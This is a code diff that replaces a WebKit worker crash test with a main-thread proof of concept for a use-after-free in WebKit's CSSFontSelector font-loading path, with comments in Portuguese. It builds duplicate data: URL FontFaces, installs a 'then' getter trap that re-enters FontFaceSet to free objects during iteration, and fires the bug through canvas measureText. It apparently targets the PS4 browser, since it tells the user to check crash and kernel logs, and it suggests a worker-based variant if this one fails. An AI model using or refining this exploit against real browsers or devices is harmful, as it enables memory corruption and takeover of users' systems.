@@ -1,15 +1,122 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta charset="utf-8">
+    <title>UAF PoC — Opcao 2 (Main Thread)</title>
+</head>
 <body>
+<pre id="log">Iniciando...</pre>
 <script>
-function finish(message)
-{
-    document.body.appendChild(document.createTextNode(message));
+// UAF PoC — CSSFontSelector::opportunisticallyStartFontDataURLLoading
+// Opcao 2: main thread, sem Worker, sem OffscreenCanvas
+//
+// Estrutura de arquivos necessaria:
+//   index.html    <- este arquivo
+//   font.woff     <- qualquer .woff pequeno (ex: Ahem.woff do WebKit test suite)
+//
+// AVISO IMPORTANTE:
+//   O commit original documenta que a sincronicidade de carregamento de
+//   data: URL fonts e especifica de Workers. No main thread, o WebKit pode
+//   processar a resolucao da Promise de FontFace.loaded em uma microtask
+//   separada (apos measureText() retornar), impedindo a reentrada.
+//
+//   Este arquivo inclui deteccao: se trapFired == false apos measureText(),
+//   o carregamento nao foi sincrono nesta versao e o UAF nao foi acionado.
+//   Nesse caso, use a Opcao 1 (transferControlToOffscreen).
+
+function log(msg) {
+    document.getElementById('log').textContent = msg;
 }
 
-const worker = new Worker('resources/opportunistic-load-reentrancy-worker5.js');
-worker.onmessage = function () { finish("PASS if no crash"); };
-worker.onerror = function (event) { finish("FAIL: worker error: " + event.message); };
+// FileReaderSync nao existe no main thread — usar FileReader async
+function loadFontAsDataURL(path) {
+    return fetch(path)
+        .then(function(r) {
+            if (!r.ok) throw new Error('HTTP ' + r.status + ' ao carregar ' + path);
+            return r.arrayBuffer();
+        })
+        .then(function(buffer) {
+            return new Promise(function(resolve, reject) {
+                var reader = new FileReader();
+                reader.onload  = function(e) { resolve(e.target.result); };
+                reader.onerror = reject;
+                reader.readAsDataURL(new Blob([buffer], { type: 'font/woff' }));
+            });
+        });
+}
+
+loadFontAsDataURL('font.woff')
+    .then(function(dataUrl) {
+        log('Fonte carregada. Configurando armadilha...');
+
+        // ---------------------------------------------------------------------------
+        // Dois FontFaces com a mesma data: URL
+        // Dois sao necessarios: o UAF ocorre na segunda iteracao do loop
+        // constituentFaces() apos m_cache ser limpo na primeira
+        // ---------------------------------------------------------------------------
+        var face1 = new FontFace('testFace', 'url("' + dataUrl + '")');
+        var face2 = new FontFace('testFace', 'url("' + dataUrl + '")');
+        document.fonts.add(face1);
+        document.fonts.add(face2);
+
+        // Popula as deferred Promises internamente no WebKit
+        void face1.loaded;
+        void face2.loaded;
+
+        // ---------------------------------------------------------------------------
+        // Getter trap em "then":
+        // Quando o WebKit testa se o FontFace resolvido e "thenable", acessa .then.
+        // Esse acesso dispara a reentrada via FontFaceSet.add() -> m_cache.clear()
+        // -> CSSSegmentedFontFace destruido durante iteracao -> UAF
+        // ---------------------------------------------------------------------------
+        var trapFired = false;
+        var reenterFontFaceSet = function() {
+            trapFired = true;
+            document.fonts.add(new FontFace('unrelated', 'local("nonexistent")'));
+        };
+        Object.defineProperty(face1, 'then', { get: reenterFontFaceSet });
+        Object.defineProperty(face2, 'then', { get: reenterFontFaceSet });
+
+        // Canvas normal — funciona no main thread (tem acesso ao DOM)
+        var canvas = document.createElement('canvas');
+        canvas.width  = 10;
+        canvas.height = 10;
+        // Inserir no DOM garante que o contexto de layout esteja disponivel
+        // para o CSSFontSelector resolver as fontes corretamente
+        canvas.style.position = 'absolute';
+        canvas.style.left = '-9999px';
+        document.body.appendChild(canvas);
+        var context = canvas.getContext('2d');
+
+        // Configura a cascade que forcara fallback para testFace
+        // "Times" nao cobre Cherokee (0x13A0), forcando lookup de testFace
+        context.font = '10px Times, testFace';
+
+        // Aciona o caminho:
+        //   measureText()
+        //     -> FontCascadeFonts::glyphDataForVariant()
+        //       -> CSSFontSelector::opportunisticallyStartFontDataURLLoading()
+        //         -> loop constituentFaces()
+        //           -> resolucao sincrona da Promise (se suportado no main thread)
+        //           -> getter .then dispara -> reentrada -> UAF
+        context.measureText(String.fromCharCode(0x13A0));
+
+        // Verificacao: o trap disparou durante measureText() (sincrono)?
+        if (trapFired) {
+            log('PASS: getter trap disparou durante measureText().\n' +
+                'Carregamento foi sincrono nesta versao do WebKit — UAF provavelmente acionado.\n' +
+                'Verificar crash / kernel logs do PS4.');
+        } else {
+            log('AVISO: getter trap NAO disparou durante measureText().\n\n' +
+                'Nesta versao do WebKit, o carregamento de data: URL fonts\n' +
+                'no main thread nao e sincrono — o UAF nao foi acionado aqui.\n\n' +
+                'Solucao: usar a Opcao 1 (transferControlToOffscreen),\n' +
+                'que preserva o Worker onde o carregamento e sincrono.');
+        }
+    })
+    .catch(function(e) {
+        log('ERRO: ' + e.message);
+    });
 </script>
 </body>
 </html>
